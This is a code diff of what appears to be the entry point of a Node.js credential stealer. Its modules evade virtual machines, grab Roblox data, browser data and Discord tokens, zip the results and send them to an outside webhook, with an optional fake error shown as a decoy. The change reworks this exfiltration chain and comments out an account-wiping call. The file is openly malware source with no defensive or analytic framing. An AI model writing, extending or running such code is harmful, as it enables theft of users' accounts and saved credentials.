@@ -6,7 +6,8 @@ const os = require('os');
 const config = require('./config');
 const { spawnSync } = require('child_process');
 const { checkVM, killTasks } = require('./functions/anti-vm');
-const { runningFromExecutable } = require('./util/general');
+const { runningFromExecutable, sleep } = require('./util/general');
+
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
 module.exports.tempFolder = tempFolder;
 spawnSync('explorer', [tempFolder]);
@@ -26,12 +27,11 @@ if (config.vmProtect && checkVM()) {
     require('./functions/grab-roblox');
     require('./functions/grab-browsers-data');
 
-    require('./functions/grab-discord-token').then(() => {
-      require('./functions/nuke-discord-account');
+    require('./functions/grab-discord-token').then(async () => {
+      //require('./functions/nuke-discord-account');
 
-      require('./functions/zip').then(zipFile => {
-        require('./functions/webhook')(zipFile);
-      });
+      await sleep(500);
+      require('./functions/zip').then(require('./functions/webhook'));
     });
     config.fakeError && require('./functions/fake-error');
   });
